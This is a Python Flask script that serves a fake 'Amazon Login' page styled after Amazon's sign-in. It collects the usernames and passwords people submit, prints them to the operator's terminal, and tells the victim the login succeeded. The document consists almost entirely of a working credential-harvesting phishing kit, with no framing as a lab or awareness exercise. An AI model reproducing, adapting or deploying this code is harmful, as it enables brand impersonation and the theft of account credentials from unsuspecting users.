from flask import Flask, request, redirect, url_for, render_template_string
from colorama import init, Fore, Style
import requests

# Initialize colorama
init()

app = Flask(__name__)

# Fetch the public IP address
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json().get('ip', 'Unable to fetch IP')
    except Exception as e:
        return f'Error: {str(e)}'

# Define the server link (replace with your actual server link)
SERVER_LINK = "http://example.com"

# Get public IP address
PUBLIC_IP = get_public_ip()

# Inline HTML for the login page
login_page_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .login-container input[type="submit"] {
            background-color: #f0c14b;
            border: 1px solid #a88734;
            color: #111;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container input[type="submit"]:hover {
            background-color: #e2b13c;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign-In</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign-In">
        </form>
    </div>
</body>
</html>
'''

# Inline HTML for the info page
info_page_html = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .info-container {{
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }}
        .info-container h1 {{
            font-size: 24px;
            margin-bottom: 20px;
        }}
        .info-container p {{
            font-size: 16px;
        }}
        .info-container a {{
            display: inline-block;
            margin-top: 20px;
            text-decoration: none;
            color: #007bff;
        }}
        .info-container a:hover {{
            text-decoration: underline;
        }}
    </style>
</head>
<body>
    <div class="info-container">
        <h1>Information Page</h1>
        <p>Welcome to the information page. Here you can find various details about our application.</p>
        <p>Server Link: <a href="{SERVER_LINK}">Visit Server Link</a></p>
        <p>Public IP Address: {PUBLIC_IP}</p>
        <a href="/">Go to Login Page</a>
    </div>
</body>
</html>
'''

# Route for the login page
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get form data
        username = request.form['username']
        password = request.form['password']

        # Print the credentials to the terminal with enhanced formatting
        print(f'\n{Fore.YELLOW}--- Login Attempt ---{Style.RESET_ALL}')
        print(f'{Fore.GREEN}Username:{Style.RESET_ALL} {Fore.CYAN}{username}{Style.RESET_ALL}')
        print(f'{Fore.GREEN}Password:{Style.RESET_ALL} {Fore.CYAN}{password}{Style.RESET_ALL}')
        print(f'{Fore.YELLOW}----------------------{Style.RESET_ALL}\n')

        # Redirect to a success page or show a success message
        return redirect(url_for('success'))

    return login_page_html

# Route for success page
@app.route('/success')
def success():
    return "Login successful!"

# Route for information page
@app.route('/info')
def info():
    return render_template_string(info_page_html)

if __name__ == '__main__':
    app.run(debug=True, port=8080)
